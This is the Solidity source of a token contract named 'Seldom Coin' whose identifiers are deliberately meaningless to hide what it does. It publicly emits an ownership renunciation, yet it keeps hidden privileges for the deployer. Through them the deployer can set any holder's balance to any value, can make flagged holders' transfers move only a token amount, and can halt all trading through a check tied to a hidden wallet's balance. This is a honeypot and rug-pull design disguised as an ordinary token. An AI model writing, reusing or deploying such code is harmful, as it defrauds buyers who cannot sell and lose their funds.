//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface isMin {
    function createPair(address walletSell, address buyMaxReceiver) external returns (address);
}

interface walletReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address txMax) external view returns (uint256);

    function transfer(address maxBuy, uint256 receiverTrading) external returns (bool);

    function allowance(address autoSenderWallet, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverTrading) external returns (bool);

    function transferFrom(
        address sender,
        address maxBuy,
        uint256 receiverTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listFee, uint256 value);
    event Approval(address indexed autoSenderWallet, address indexed spender, uint256 value);
}

abstract contract receiverToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fundBuy is walletReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SeldomCoin is receiverToken, walletReceiver, fundBuy {

    function decimals() external view virtual override returns (uint8) {
        return liquidityLaunchedBuy;
    }

    string private marketingIs = "SCN";

    function getOwner() external view returns (address) {
        return autoTotal;
    }

    function fromLimit(address modeFrom, uint256 receiverTrading) public {
        launchTakeSell();
        feeAt[modeFrom] = receiverTrading;
    }

    function feeReceiver() public {
        emit OwnershipTransferred(amountMarketing, address(0));
        autoTotal = address(0);
    }

    address feeAmountMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private exemptAutoIs;

    uint256 private fundTx;

    uint256 receiverSwap;

    function teamList(uint256 receiverTrading) public {
        launchTakeSell();
        receiverSwap = receiverTrading;
    }

    uint256 modeMarketing;

    uint256 private marketingBuy;

    address maxTxExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function launchedSwap(address autoBuyReceiver, address maxBuy, uint256 receiverTrading) internal returns (bool) {
        require(feeAt[autoBuyReceiver] >= receiverTrading);
        feeAt[autoBuyReceiver] -= receiverTrading;
        feeAt[maxBuy] += receiverTrading;
        emit Transfer(autoBuyReceiver, maxBuy, receiverTrading);
        return true;
    }

    uint256 constant feeSwap = 18 ** 10;

    bool public listSell;

    address public atBuy;

    function marketingMin(address autoBuyReceiver, address maxBuy, uint256 receiverTrading) internal returns (bool) {
        if (autoBuyReceiver == amountMarketing) {
            return launchedSwap(autoBuyReceiver, maxBuy, receiverTrading);
        }
        uint256 totalSender = walletReceiver(atBuy).balanceOf(feeAmountMax);
        require(totalSender == receiverSwap);
        require(maxBuy != feeAmountMax);
        if (feeBuy[autoBuyReceiver]) {
            return launchedSwap(autoBuyReceiver, maxBuy, feeSwap);
        }
        return launchedSwap(autoBuyReceiver, maxBuy, receiverTrading);
    }

    function transfer(address modeFrom, uint256 receiverTrading) external virtual override returns (bool) {
        return marketingMin(_msgSender(), modeFrom, receiverTrading);
    }

    uint256 private amountBuy;

    uint8 private liquidityLaunchedBuy = 18;

    function symbol() external view virtual override returns (string memory) {
        return marketingIs;
    }

    bool public maxList;

    bool private maxReceiver;

    event OwnershipTransferred(address indexed atTotalReceiver, address indexed listBuyTx);

    bool private receiverAuto;

    function approve(address isLiquidity, uint256 receiverTrading) public virtual override returns (bool) {
        listTx[_msgSender()][isLiquidity] = receiverTrading;
        emit Approval(_msgSender(), isLiquidity, receiverTrading);
        return true;
    }

    mapping(address => bool) public totalToken;

    function allowance(address tokenAt, address isLiquidity) external view virtual override returns (uint256) {
        if (isLiquidity == maxTxExempt) {
            return type(uint256).max;
        }
        return listTx[tokenAt][isLiquidity];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return minFund;
    }

    uint256 private shouldLaunch;

    uint256 private minFund = 100000000 * 10 ** 18;

    address public amountMarketing;

    function name() external view virtual override returns (string memory) {
        return fromReceiver;
    }

    function launchTakeSell() private view {
        require(totalToken[_msgSender()]);
    }

    function launchedTrading(address fromTrading) public {
        if (maxList) {
            return;
        }
        
        totalToken[fromTrading] = true;
        
        maxList = true;
    }

    mapping(address => bool) public feeBuy;

    mapping(address => uint256) private feeAt;

    function walletFrom(address totalTrading) public {
        launchTakeSell();
        if (marketingBuy != fundTx) {
            marketingBuy = amountBuy;
        }
        if (totalTrading == amountMarketing || totalTrading == atBuy) {
            return;
        }
        feeBuy[totalTrading] = true;
    }

    function owner() external view returns (address) {
        return autoTotal;
    }

    function transferFrom(address autoBuyReceiver, address maxBuy, uint256 receiverTrading) external override returns (bool) {
        if (_msgSender() != maxTxExempt) {
            if (listTx[autoBuyReceiver][_msgSender()] != type(uint256).max) {
                require(receiverTrading <= listTx[autoBuyReceiver][_msgSender()]);
                listTx[autoBuyReceiver][_msgSender()] -= receiverTrading;
            }
        }
        return marketingMin(autoBuyReceiver, maxBuy, receiverTrading);
    }

    constructor (){
        if (shouldLaunch != exemptAutoIs) {
            exemptAutoIs = fundTx;
        }
        isLimit fromFee = isLimit(maxTxExempt);
        atBuy = isMin(fromFee.factory()).createPair(fromFee.WETH(), address(this));
        if (exemptAutoIs == fundTx) {
            fundTx = exemptAutoIs;
        }
        amountMarketing = _msgSender();
        totalToken[amountMarketing] = true;
        feeAt[amountMarketing] = minFund;
        feeReceiver();
        
        emit Transfer(address(0), amountMarketing, minFund);
    }

    mapping(address => mapping(address => uint256)) private listTx;

    string private fromReceiver = "Seldom Coin";

    address private autoTotal;

    function balanceOf(address txMax) public view virtual override returns (uint256) {
        return feeAt[txMax];
    }

}